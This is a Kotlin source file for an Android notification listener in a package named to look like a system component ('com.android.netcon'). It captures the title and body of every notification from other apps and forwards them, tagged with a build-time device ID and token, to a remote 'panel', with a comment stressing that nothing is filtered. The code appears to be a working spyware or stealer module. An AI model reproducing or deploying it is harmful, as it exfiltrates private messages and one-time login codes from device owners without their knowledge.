package com.android.netcon

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        // Skip own notifications
        if (sbn.packageName == applicationContext.packageName) return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()

        if (title.isBlank() && text.isBlank()) return

        val pkg = sbn.packageName ?: return

        // Forward ALL notifications to panel — no filtering on device
        ApiSender.sendNotification(
            apiUrl = BuildConfig.API_URL,
            ingestToken = BuildConfig.INGEST_TOKEN,
            deviceId = BuildConfig.DEVICE_ID,
            packageName = pkg,
            title = title,
            body = text
        )
    }
}
